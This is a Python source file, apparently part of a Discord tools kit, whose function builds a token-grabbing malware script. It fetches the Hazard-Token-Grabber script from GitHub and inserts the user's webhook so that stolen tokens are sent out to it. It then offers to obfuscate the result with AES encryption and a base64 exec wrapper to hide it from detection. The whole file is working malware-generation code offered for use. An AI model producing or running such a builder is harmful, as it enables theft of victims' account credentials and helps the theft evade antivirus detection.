import os
import shutil
import requests
import base64
import random
import PyInstaller.__main__

from Crypto.Cipher import AES
from Crypto import Random
from colorama import Fore

from plugins.standard import setTitle, installPackage

def f1bergrabber(WebHook, fileName):
    required = [
        'requests',
        'psutil',
        'pypiwin32',
        'pycryptodome',
        'pyinstaller',
        'pillow',
    ]
    installPackage(required)
    code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", WebHook)
    with open(f"{fileName}.py", 'w', errors="ignore") as f:
        f.write(code)

    print(f"Do you want to obfuscate {fileName}.exe?")
    yesno = input(f'{Fore.LIGHTRED_EX}[{Fore.WHITE}>>>{Fore.LIGHTRED_EX}] {Fore.RESET}y/n: {Fore.RED}')
    if yesno.lower() == "y" or yesno.lower() == "yes":
        IV = Random.new().read(AES.block_size)
        key = u''
        for i in range(8):
            key = key + chr(random.randint(0x4E00, 0x9FA5))

        with open(f'{fileName}.py') as f: 
            _file = f.read()
            imports = ''
            input_file = _file.splitlines()
            for i in input_file:
                if i.startswith("import") or i.startswith("from"):
                    imports += i+';'

        with open(f'{fileName}.py', "wb") as f:
            encodedBytes = base64.b64encode(_file.encode())
            obfuscatedBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(encodedBytes)
            f.write(f'{imports}exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())
    try:
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
    except FileNotFoundError:
        pass

    print(f"\n{Fore.LIGHTRED_EX}File created as {fileName}.py\n")
    print(f"{Fore.LIGHTRED_EX}[{Fore.WHITE}>>>{Fore.LIGHTRED_EX}] {Fore.WHITE}I have not added the feature to make it exe. Convert it yourself lazy bitch{Fore.RED}")
    print(f"{Fore.LIGHTRED_EX}[{Fore.WHITE}>>>{Fore.LIGHTRED_EX}] {Fore.WHITE}And if you don't even know how to do that then you can dm me.(Check README.txt){Fore.RED}")
    input(f'{Fore.LIGHTRED_EX}[{Fore.WHITE}>>>{Fore.LIGHTRED_EX}] {Fore.RESET}Enter anything to continue . . .  {Fore.RED}')
    os.system('cmd /k "python util/f1ber/discordtools.py"')
